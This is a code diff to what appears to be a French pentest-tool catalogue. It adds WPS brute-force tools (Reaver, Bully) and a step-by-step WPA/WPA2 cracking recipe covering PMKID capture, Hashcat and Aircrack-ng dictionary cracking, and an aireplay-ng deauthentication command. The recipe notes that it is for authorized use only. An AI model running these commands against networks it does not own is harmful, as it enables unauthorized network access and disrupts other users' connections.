@@ -343,6 +343,10 @@ const TOOLS = [
     desc: "Détecteur/sniffer sans fil (Wi-Fi, Bluetooth, SDR).", tags: "wifi detection sniff bluetooth sdr" },
   { name: "hcxtools / hcxdumptool", url: "https://github.com/ZerBea/hcxtools", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
     desc: "Capture de PMKID et conversion de handshakes pour Hashcat.", tags: "wifi pmkid handshake hashcat conversion" },
+  { name: "Reaver", url: "https://github.com/t6x/reaver-wps-fork-t6x", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
+    desc: "Bruteforce en ligne du PIN WPS pour récupérer la clé WPA/WPA2 (aussi attaque Pixie Dust).", cmd: "reaver -i wlan0mon -b <BSSID> -vv", tags: "wifi wps pin bruteforce pixie dust clé wpa" },
+  { name: "Bully", url: "https://github.com/aanarchyy/bully", cat: "wireless", platforms: ["linux"], phases: ["exploit"],
+    desc: "Alternative à Reaver pour le bruteforce du PIN WPS, plus robuste sur certaines puces.", cmd: "bully wlan0mon -b <BSSID> -c <canal>", tags: "wifi wps pin bruteforce clé wpa" },
 
   /* ===== Wordlists & payloads ===== */
   { name: "SecLists", url: "https://github.com/danielmiessler/SecLists", cat: "wordlists", platforms: ["multi"], phases: ["support"], star: true,
@@ -734,7 +738,19 @@ const CHEATS = [
       { tool: "Elastic Stack (ELK)", cmd: "Event 4769/4768 (Kerberoast/Golden), 4662 (DCSync), 4624 type 3" },
       { tool: "Atomic Red Team", cmd: "Rejouer les TTP pour valider la couverture de détection" }
     ],
-    note: "Correspondance offensif ↔ défensif : chaque technique (roasting, DCSync, PTH) laisse des traces dans les Event IDs Windows." }
+    note: "Correspondance offensif ↔ défensif : chaque technique (roasting, DCSync, PTH) laisse des traces dans les Event IDs Windows." },
+
+  { icon: "📶", title: "Je veux casser une clé Wi-Fi WPA/WPA2",
+    phase: "exploit",
+    steps: [
+      { tool: "airmon-ng", cmd: "airmon-ng start wlan0   # carte en mode monitor -> wlan0mon" },
+      { tool: "hcxdumptool", cmd: "hcxdumptool -i wlan0mon -o wifi.pcapng --enable_status=1   # capture PMKID / handshake" },
+      { tool: "hcxtools", cmd: "hcxpcapngtool -o wifi.hc22000 wifi.pcapng   # conversion pour Hashcat (mode 22000)" },
+      { tool: "Hashcat", cmd: "hashcat -m 22000 wifi.hc22000 rockyou.txt   # cassage dictionnaire (GPU, rapide)" },
+      { tool: "Aircrack-ng", cmd: "aircrack-ng -w rockyou.txt wifi.cap   # alternative si handshake .cap" },
+      { tool: "Reaver", cmd: "reaver -i wlan0mon -b <BSSID> -vv   # si le WPS est activé : bruteforce du PIN" }
+    ],
+    note: "Strictement sur ton propre réseau ou avec autorisation écrite. Le PMKID (hcxdumptool) ne nécessite aucun client connecté ; sinon force un handshake par déauth : aireplay-ng --deauth 5 -a <BSSID> wlan0mon." }
 ];
 
 /* Expose global (compat file:// et GitHub Pages) */
